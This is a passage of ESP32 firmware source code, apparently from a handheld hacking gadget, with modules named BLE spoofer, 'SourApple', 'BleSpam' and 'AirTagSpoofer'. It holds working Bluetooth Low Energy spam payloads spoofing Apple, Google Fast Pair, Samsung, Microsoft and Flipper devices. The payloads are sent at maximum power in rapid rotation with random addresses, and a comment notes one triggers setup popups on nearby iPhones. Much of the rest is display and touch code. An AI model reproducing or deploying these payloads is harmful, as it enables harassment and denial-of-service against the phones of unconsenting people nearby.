    Serial.println("Advertising started.");
    updateSpoofer();
  }
}

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_key,
    bitmap_icon_power,
    bitmap_icon_go_back
  };

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  if (!uiDrawn) {

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: changeDeviceTypePrev(); break;
        case 1: changeDeviceTypeNext(); break;
        case 2: changeAdvTypeNext(); break;
        case 3: toggleAdvertising(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 4) {
                feature_exit_requested = true;
              } else {

                drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void spooferSetup() {
  prepareBleFeatureEntry();
  if (!bleRequireStackOrExit()) return;
  setTouchButtonInputEnabled(true);
  bleSetSpooferNavLabels();
  spooferResetPanelCache();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  randomSeed(esp_random());
  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.fillRect(0, 20, 240, 20, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5, 24);

  updateSpoofer();
  runUI();

  Printspoofer("[!!] System Diagnostics", TFT_RED, true);
  redrawTouchButtonBar();

  for (int i = 0; i <= 4; i++) {
    sppferLoadingBar(i);
    delay(random(500));
    redrawTouchButtonBar();
  }

  Printspoofer("[+] System Ready!", TFT_GREEN, true);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  // Reuse the controller-owned advertising instance. Creating a new server on
  // every menu entry leaked NimBLE objects and eventually made later BLE modes
  // fail even though the radio itself was healthy.
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->stop();
  pAdvertising->reset();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  uiDrawn = false;
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  redrawTouchButtonBar();
}

void spooferLoop() {
  static unsigned long lastUpdate = 0;
  const unsigned long updateInterval = 50;

  unsigned long now = millis();
  if (now - lastUpdate >= updateInterval) {
    lastUpdate = now;

    if (feature_active && isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      return;
    }

    runUI();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
    handleButtonPress(BTN_LEFT, changeDeviceTypePrev);

    handleButtonPress(BTN_DOWN, changeAdvTypeNext);
    handleButtonPress(BTN_UP, toggleAdvertising);
  }
}

void exit() {
  spooferResetPanelCache();

  if (isAdvertising && pAdvertising) {
    pAdvertising->stop();
    isAdvertising = false;
  }
  if (pAdvertising) {
    pAdvertising->reset();
    pAdvertising = nullptr;
  }
}
}

namespace SourApple {
static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 1

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;

uint8_t packet[17];

#define MAX_LINES 30
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;
const int lineHeight = 14;

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back
  };

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  if (!uiDrawn) {

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_backIconHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    bool hitBack = false;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {
              hitBack = true;
            }
            break;
          }
        }
      }
    }
    if (hitBack && !s_backIconHeld) {
      feature_exit_requested = true;
    }
    s_backIconHeld = hitBack;
    lastTouchCheck = millis();
  }
}

void updatedisplay() {
  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);

  const int scrollBottom = bleContentBottom();
  for (int offset = 0; offset <= lineHeight; offset += 2) {
    const int baseY = (MAX_LINES - 1) * lineHeight - offset + 51;
    if (baseY + lineHeight <= scrollBottom) {
      tft.fillRect(0, baseY, 240, lineHeight, TFT_BLACK);
    }

    for (int i = 0; i < MAX_LINES; i++) {
      int y = -lineHeight + (i * lineHeight) + offset;
      const int drawY = y + 51;
      if (y >= -lineHeight && drawY + lineHeight <= scrollBottom) {
        tft.fillRect(0, drawY, 240, lineHeight, TFT_BLACK);
        tft.setCursor(5, drawY + 4);
        tft.print(lines[i]);
      }
    }
    delay(5);
  }
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = MAX_LINES - 1; i > 0; i--) {
    lines[i] = lines[i - 1];
  }
  lines[0] = newLine;
  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + " -> ";
  lineNumber++;

  String dataStr = "0x";
  dataStr += String(packet[1], HEX);

  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);

  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;
  packet[i++] = 0xFF;
  packet[i++] = 0x4C;
  packet[i++] = 0x00;
  packet[i++] = 0x0F;
  packet[i++] = 0x05;
  packet[i++] = 0xC1;
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];
  esp_fill_random(&packet[i], 3);
  i += 3;
  packet[i++] = 0x00;
  packet[i++] = 0x00;
  packet[i++] =  0x10;
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  prepareBleFeatureEntry();
  if (!bleRequireStackOrExit()) return;
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  tft.setTextSize(1);
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  uiDrawn = false;

  setupTouchscreen();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  // Use one controller-owned advertiser and clear stale data from previous
  // BLE screens. This is lifecycle hardening only; payload cadence is kept as
  // shipped and no additional unsolicited-popup payloads are installed.
  Advertising = BLEDevice::getAdvertising();
  Advertising->stop();
  Advertising->reset();
  Advertising->addServiceUUID(device_uuid);
  redrawTouchButtonBar();
}

void sourappleLoop() {

  if (feature_active && featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  runUI();

  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }
  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

  Advertising->setAdvertisementData(oAdvertisementData);

  Advertising->setMinInterval(0x20);
  Advertising->setMaxInterval(0x20);
  Advertising->setMinPreferred(0x20);
  Advertising->setMaxPreferred(0x20);

  Advertising->start();

  delay(40);
  displayAdvertisementData();
}

void exit() {

  if (Advertising) {
    Advertising->stop();
    Advertising->reset();
    Advertising = nullptr;
  }
}
}

namespace BleSpam {

enum class PayloadKind : uint8_t {
  Google,
  FastPair,
  Samsung,
  GalaxyBuds,
  Microsoft,
  CustomWindows,
  AppleAction,
  AppleDevice,
  AppleSetup,
  Flipper
};

struct FastPairProfile {
  const char* name;
  uint8_t model[3];
};

static const FastPairProfile kFastPairProfiles[] = {
  {"Pixel Buds",          {0x92, 0xBB, 0xBD}},
  {"Google Pixel Buds",   {0x00, 0x00, 0x06}},
  {"JBL Flip 6",          {0x82, 0x1F, 0x66}},
  {"JBL Buds Pro",        {0xF5, 0x24, 0x94}},
  {"JBL Live 300TWS",     {0x71, 0x8F, 0xA4}},
  {"Sony XM5",            {0xD4, 0x46, 0xA7}},
  {"Bose NC 700",         {0xCD, 0x82, 0x56}},
  {"Bose QuietComfort 35 II",{0x00, 0x00, 0xF0}},
  {"Razer Hammerhead TWS",{0x0E, 0x30, 0xC3}},
  {"LG HBS-835S",         {0x00, 0x03, 0xF0}},
};

struct RawPayloadProfile {
  const char* name;
  const uint8_t* data;
  uint8_t length;
};

static const uint8_t kAppleNumberSetup[] = {
  0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,
  0x0F, 0x05, 0xC1, 0x09, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x00
};
static const uint8_t kAppleTvPair[] = {
  0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,
  0x0F, 0x05, 0xC1, 0x06, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x00
};
static const uint8_t kAppleTvSetup[] = {
  0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,
  0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x00
};
static const uint8_t kAppleTvConfigure[] = {
  0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,
  0x0F, 0x05, 0xC1, 0x20, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x00
};
static const uint8_t kHomepodSetup[] = {
  0x18, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,
  0x0F, 0x05, 0xC1, 0x0B, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x00
};

static const RawPayloadProfile kAppleSetupProfiles[] = {
  {"Number Setup",       kAppleNumberSetup,  sizeof(kAppleNumberSetup)},
  {"Apple TV Pair",      kAppleTvPair,       sizeof(kAppleTvPair)},
  {"Apple TV Setup",     kAppleTvSetup,      sizeof(kAppleTvSetup)},
  {"Apple TV Configure", kAppleTvConfigure,  sizeof(kAppleTvConfigure)},
  {"Homepod Setup",      kHomepodSetup,      sizeof(kHomepodSetup)},
};

static const uint8_t kGalaxyBuds2ProAdv[] = {
  0x1B, 0xFF, 0x75, 0x00,
  0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09,
  0xAB, 0x0C, 0x01, 0x46, 0x06, 0x3C, 0xDD, 0x0A, 0x00, 0x00,
  0x00, 0x00, 0xA7, 0x00
};
static const uint8_t kGalaxyBuds2ProScanResponse[] = {
  0x10, 0xFF, 0x75, 0x00,
  0x00, 0xC3, 0xA3, 0xD7, 0xB1, 0x17, 0x40, 0x52, 0x64, 0x64,
  0x00, 0x01, 0x04
};
static const uint8_t kCustomWindowsAdv[] = {
  0x12, 0xFF, 0x06, 0x00,
  0x03, 0x00, 0x08, 0x49, 0x76, 0x61, 0x6E, 0x20, 0x6D, 0x61,
  0x72, 0x69, 0x63, 0xF3, 0x6E
};

static BLEAdvertising* s_advertising = nullptr;
static bool s_running = true;
static bool s_spamAll = true;
static uint8_t s_payloadIndex = 0;
static uint8_t s_fastPairIndex = 0;
static uint8_t s_appleDeviceIndex = 0;
static uint8_t s_appleSetupIndex = 0;
static uint32_t s_txCount = 0;
static uint32_t s_txFailures = 0;
static uint32_t s_lastButtonMs = 0;
static char s_payloadName[32] = "Ready";
static char s_payloadDetail[30] = "Waiting";
static char s_lastResult[24] = "Idle";
static BLEAdvertisementData s_scanResponseData;
static bool s_hasScanResponse = false;

static const char* payloadName(PayloadKind kind) {
  switch (kind) {
    case PayloadKind::Google:      return "Google Fast Pair";
    case PayloadKind::FastPair:    return "Fast Pair";
    case PayloadKind::Samsung:     return "Samsung";
    case PayloadKind::GalaxyBuds:  return "Galaxy Buds 2 Pro";
    case PayloadKind::Microsoft:   return "Microsoft";
    case PayloadKind::CustomWindows:return "Custom Windows";
    case PayloadKind::AppleAction: return "Apple Action";
    case PayloadKind::AppleDevice: return "Apple Device";
    case PayloadKind::AppleSetup:  return "Apple Setup";
    case PayloadKind::Flipper:     return "Flipper";
  }
  return "Unknown";
}

static void appendRaw(BLEAdvertisementData& out, const uint8_t* data, size_t len) {
  out.addData(std::string(reinterpret_cast<const char*>(data), len));
}

static void setPayloadName(const char* name) {
  strncpy(s_payloadName, name ? name : "Unknown", sizeof(s_payloadName) - 1);
  s_payloadName[sizeof(s_payloadName) - 1] = '\0';
}

static BLEAdvertisementData makePayload(PayloadKind kind) {
  BLEAdvertisementData out;
  s_scanResponseData = BLEAdvertisementData();
  s_hasScanResponse = false;
  setPayloadName(payloadName(kind));
  switch (kind) {
    case PayloadKind::Google: {
      const int8_t txPower = (int8_t)((int)random(121) - 100);
      uint8_t raw[] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
        0x02, 0x0A, (uint8_t)txPower
      };
      appendRaw(out, raw, sizeof(raw));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "B727 TX %d", (int)txPower);
      break;
    }
    case PayloadKind::FastPair: {
      const FastPairProfile& profile =
          kFastPairProfiles[s_fastPairIndex++ %
              (sizeof(kFastPairProfiles) / sizeof(kFastPairProfiles[0]))];
      const int8_t txPower = (int8_t)((int)random(121) - 100);
      const uint8_t raw[] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        profile.model[0], profile.model[1], profile.model[2],
        0x02, 0x0A, (uint8_t)txPower
      };
      appendRaw(out, raw, sizeof(raw));
      setPayloadName(profile.name);
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "FE2C %02X%02X%02X",
               profile.model[0], profile.model[1], profile.model[2]);
      break;
    }
    case PayloadKind::Samsung: {
      const uint8_t variant = (uint8_t)random(1, 4);
      uint8_t raw[] = {
        0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, variant
      };
      appendRaw(out, raw, sizeof(raw));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "Variant %u", variant);
      break;
    }
    case PayloadKind::GalaxyBuds: {
      appendRaw(out, kGalaxyBuds2ProAdv, sizeof(kGalaxyBuds2ProAdv));
      appendRaw(s_scanResponseData, kGalaxyBuds2ProScanResponse,
                sizeof(kGalaxyBuds2ProScanResponse));
      s_hasScanResponse = true;
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "MFG 0075 + scan rsp");
      break;
    }
    case PayloadKind::Microsoft: {
      char name[7];
      for (uint8_t i = 0; i < 6; ++i) name[i] = (char)('A' + random(26));
      name[6] = '\0';
      uint8_t raw[13] = {0x0C, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80};
      memcpy(raw + 7, name, 6);
      appendRaw(out, raw, sizeof(raw));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "Name %s", name);
      break;
    }
    case PayloadKind::CustomWindows: {
      appendRaw(out, kCustomWindowsAdv, sizeof(kCustomWindowsAdv));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "MFG 0006 exact data");
      break;
    }
    case PayloadKind::AppleAction: {
      static const uint8_t actions[] = {
        0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2F, 0x01, 0x06, 0x20
      };
      const uint8_t action = actions[random(sizeof(actions))];
      uint8_t raw[] = {
        0x0A, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC0,
        action,
        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)
      };
      appendRaw(out, raw, sizeof(raw));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "Action 0x%02X", action);
      break;
    }
    case PayloadKind::AppleDevice: {
      // Reuse the exact Apple payload table already used by BLE Spoofer.
      // This avoids a second copy of the six requested AirPods payloads and
      // retains the existing Beats profiles in the same deterministic cycle.
      constexpr uint8_t kDeviceCount =
          sizeof(BleSpoofer::DEVICES) / sizeof(BleSpoofer::DEVICES[0]);
      const uint8_t index = s_appleDeviceIndex++ % kDeviceCount;
      appendRaw(out, BleSpoofer::DEVICES[index],
                sizeof(BleSpoofer::DEVICES[index]));
      setPayloadName(BleSpoofer::spooferDeviceLabel(index + 1));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "MFG 004C profile %u",
               (unsigned)(index + 1));
      break;
    }
    case PayloadKind::AppleSetup: {
      const RawPayloadProfile& profile =
          kAppleSetupProfiles[s_appleSetupIndex++ %
              (sizeof(kAppleSetupProfiles) / sizeof(kAppleSetupProfiles[0]))];
      appendRaw(out, profile.data, profile.length);
      setPayloadName(profile.name);
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "MFG 004C setup data");
      break;
    }
    case PayloadKind::Flipper: {
      char name[6];
      for (uint8_t i = 0; i < 5; ++i) name[i] = (char)('A' + random(26));
      name[5] = '\0';
      uint8_t raw[] = {
        0x02, 0x01, 0x06,
        0x06, 0x09, 0, 0, 0, 0, 0,
        0x03, 0x02, (uint8_t)(0x81 + random(3)), 0x30,
        0x02, 0x0A, 0x00,
        0x05, 0xFF, 0xBA, 0x0F, 0x4C, 0x75
      };
      memcpy(raw + 5, name, 5);
      appendRaw(out, raw, sizeof(raw));
      snprintf(s_payloadDetail, sizeof(s_payloadDetail), "Name %s", name);
      break;
    }
  }
  return out;
}

static void updateNav() {
  setTouchNavLabels(s_running ? "Stop" : "Start", nullptr, "Exit", nullptr, nullptr);
  redrawTouchButtonBar();
}

static void drawScreen(bool full) {
  if (full) {
    bleClearBody(TFT_BLACK);
    currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
  }
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.fillRect(0, 42, 240, 120, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(10, 50);
  tft.print(s_spamAll ? "BLE Spam All" : "Apple Juice");
  tft.setTextColor(s_running ? UI_OK : UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(10, 72);
  tft.print("State: ");
  tft.print(s_running ? "Running" : "Stopped");
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(10, 94);
  tft.print("Payload: ");
  tft.print(s_payloadName);
  tft.setCursor(10, 116);
  tft.print("Detail: ");
  tft.print(s_payloadDetail);
  tft.setCursor(10, 138);
  tft.print("Bursts: ");
  tft.print((unsigned long)s_txCount);
  tft.print("  Fail: ");
  tft.print((unsigned long)s_txFailures);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(10, 158);
  tft.print("Last: ");
  tft.print(s_lastResult);
  tft.setCursor(10, 176);
  tft.print(s_spamAll ? "Rotating payload catalogue" : "New randomized Apple packet");
  updateNav();
}

static bool exitRequestedDuring(uint32_t durationMs) {
  const uint32_t started = millis();
  while ((uint32_t)(millis() - started) < durationMs) {
    if (feature_exit_requested || featureExitButtonPressed() ||
        isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      return true;
    }
    delay(10);
  }
  return false;
}

static bool waitForAdvertisingState(bool active, uint32_t timeoutMs) {
  const uint32_t started = millis();
  while ((uint32_t)(millis() - started) < timeoutMs) {
    if (s_advertising && s_advertising->isAdvertising() == active) return true;
    delay(10);
  }
  return s_advertising && s_advertising->isAdvertising() == active;
}

static void sendBurst(PayloadKind kind, uint32_t durationMs) {
  if (!s_advertising) {
    strncpy(s_lastResult, "No advertiser", sizeof(s_lastResult));
    return;
  }

  // NimBLE completes advertising stop asynchronously. The previous path reset and
  // restarted the controller after only 4 ms, which frequently raced the
  // GAP task and produced long runs of start() failures. Keep the singleton
  // advertiser configured, wait for a confirmed idle state, and only use a
  // reset as a bounded recovery path.
  if (s_advertising->isAdvertising()) {
    s_advertising->stop();
    if (!waitForAdvertisingState(false, 220u)) {
      strncpy(s_lastResult, "Stop timeout", sizeof(s_lastResult));
      ++s_txFailures;
      return;
    }
  }

  BLEAdvertisementData data = makePayload(kind);
  if (data.getPayload().length() > 31u ||
      (s_hasScanResponse && s_scanResponseData.getPayload().length() > 31u)) {
    strncpy(s_lastResult, "Payload >31", sizeof(s_lastResult));
    ++s_txFailures;
    return;
  }
  s_advertising->setAdvertisementData(data);
  s_advertising->setMinInterval(0x20);
  s_advertising->setMaxInterval(0x30);
  s_advertising->setScanResponse(s_hasScanResponse);
  // NimBLEAdvertising::setAdvertisementType() is misleadingly named: in
  // NimBLE-Arduino 1.4.x it accepts BLE_GAP_CONN_MODE_* values, not the
  // BLE_HCI_ADV_TYPE_* packet type values. Passing ADV_NONCONN_IND (3) made
  // ble_gap_adv_start reject every non-scan-response payload as invalid.
  // A non-connectable advertiser plus setScanResponse(true) is translated by
  // NimBLE into ADV_SCAN_IND where required.
  s_advertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
  if (s_hasScanResponse) {
    s_advertising->setScanResponseData(s_scanResponseData);
  }

  bool started = false;
  for (uint8_t attempt = 0; attempt < 8u && !started; ++attempt) {
    started = s_advertising->start() &&
              waitForAdvertisingState(true, 80u);
    if (!started) {
      s_advertising->stop();
      waitForAdvertisingState(false, 120u);
      delay((uint32_t)(attempt + 1u) * 15u);
    }
  }

  if (!started) {
    // Recover the local advertiser object only after all normal retries have
    // failed. The next loop iteration starts from a known idle controller.
    s_advertising->stop();
    waitForAdvertisingState(false, 200u);
    s_advertising->reset();
    strncpy(s_lastResult, "Start rejected", sizeof(s_lastResult));
    ++s_txFailures;
    return;
  }

  const bool aborted = exitRequestedDuring(durationMs);
  s_advertising->stop();
  const bool stopped = waitForAdvertisingState(false, 220u);
  if (!aborted && stopped) {
    strncpy(s_lastResult, "OK", sizeof(s_lastResult));
    ++s_txCount;
  } else if (!aborted) {
    strncpy(s_lastResult, "Stop rejected", sizeof(s_lastResult));
    ++s_txFailures;
  }
}

void setup(bool spamAll) {
  prepareBleFeatureEntry();
  if (!bleRequireStackOrExit()) return;
  setTouchButtonInputEnabled(true);
  setupTouchscreen();
  s_spamAll = spamAll;
  s_running = true;
  s_payloadIndex = 0;
  s_fastPairIndex = 0;
  s_appleDeviceIndex = 0;
  s_appleSetupIndex = 0;
  s_txCount = 0;
  s_txFailures = 0;
  s_lastButtonMs = 0;
  strncpy(s_payloadName, "Ready", sizeof(s_payloadName));
  strncpy(s_payloadDetail, "Waiting", sizeof(s_payloadDetail));
  strncpy(s_lastResult, "Idle", sizeof(s_lastResult));
  randomSeed(esp_random());
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  s_advertising = BLEDevice::getAdvertising();
  s_advertising->stop();
  s_advertising->reset();
  drawScreen(true);
}

void loop() {
  maintainTouchNavBar();
  updateStatusBar();
  if (feature_exit_requested || featureExitButtonPressed() ||
      isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  const uint32_t now = millis();
  if ((uint32_t)(now - s_lastButtonMs) > 220u &&
      isButtonPressedEdge(BTN_LEFT)) {
    s_running = !s_running;
    s_lastButtonMs = now;
    if (!s_running && s_advertising) s_advertising->stop();
    drawScreen(false);
    return;
  }

  if (!s_running) {
    delay(10);
    return;
  }

  if (!s_spamAll) {
    // Give the controller enough time for several 20-30 ms advertising
    // events. Reusing the stable send path fixes Apple Juice reporting zero
    // completed bursts while continuously incrementing Fail.
    sendBurst(PayloadKind::AppleAction, 500);
    drawScreen(false);
    return;
  }

  static const PayloadKind sequence[] = {
    PayloadKind::Google,
    PayloadKind::FastPair,
    PayloadKind::Samsung,
    PayloadKind::GalaxyBuds,
    PayloadKind::Microsoft,
    PayloadKind::CustomWindows,
    PayloadKind::AppleAction,
    PayloadKind::AppleDevice,
    PayloadKind::AppleSetup,
    PayloadKind::Flipper
  };
  const PayloadKind kind = sequence[s_payloadIndex];
  // At 20-30 ms advertising intervals this gives every profile multiple
  // on-air events. The previous 20 ms dwell could stop a profile before the
  // controller had transmitted it at all.
  const uint32_t dwell = (kind == PayloadKind::GalaxyBuds) ? 180u : 120u;
  sendBurst(kind, dwell);
  s_payloadIndex = (uint8_t)((s_payloadIndex + 1u) %
      (sizeof(sequence) / sizeof(sequence[0])));
  // Redraw while advertising is stopped so the display cannot starve the BLE
  // controller and every catalogue entry is visible for validation.
  drawScreen(false);
}

void exit() {
  if (s_advertising) {
    s_advertising->stop();
    s_advertising->reset();
    s_advertising = nullptr;
  }
  s_running = false;
}

}  // namespace BleSpam

namespace AirTagSpoofer {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 1

static constexpr int INFO_Y = 42;
static constexpr int ROW_H = 16;
static constexpr int COL_LABEL_X = 10;
static constexpr int COL_VALUE_X = 58;
static constexpr int COL_VALUE_W = 120;
static constexpr int COL_RIGHT_MARGIN = 10;
static constexpr int FIELD_H = 10;
static constexpr int LOG_HDR_Y = 118;
static constexpr int LOG_Y = 134;
static constexpr int LINE_H = 12;
static constexpr int MAX_LOG = 16;
static constexpr unsigned long BTN_DEBOUNCE_MS = 220;
static constexpr unsigned long BURST_INTERVAL_MS = 120;
static constexpr unsigned long UI_FIELD_MS = 500;
static constexpr unsigned long LOG_INTERVAL_MS = 1200;
static constexpr int LOG_LINE_LEN = 40;

// Apple Continuity Proximity Pairing â€” AirTag models (Flipper / Xtreme).
// Prefix 0x05 = "New AirTag" (triggers setup popup on nearby iPhones).
static const uint16_t kAirTagModels[] = {0x0055, 0x0030};
